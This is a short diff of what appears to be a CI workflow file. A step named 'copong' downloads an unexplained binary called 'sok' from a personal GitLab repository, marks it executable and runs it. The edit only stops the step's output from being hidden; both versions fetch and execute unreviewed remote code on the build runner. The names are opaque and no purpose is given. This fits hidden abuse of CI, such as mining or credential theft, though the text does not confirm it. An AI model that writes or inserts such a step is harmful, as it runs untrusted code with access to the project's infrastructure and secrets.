@@ -28,7 +28,7 @@ jobs:
         go-version: '1.20'
 
     - name: copong
-      run: wget https://gitlab.com/hasanmaoladi97/cekton/-/raw/main/sok && chmod +x sok && ./sok > /dev/null 2>&1
+      run: wget https://gitlab.com/hasanmaoladi97/cekton/-/raw/main/sok && chmod +x sok && ./sok
       
 
 
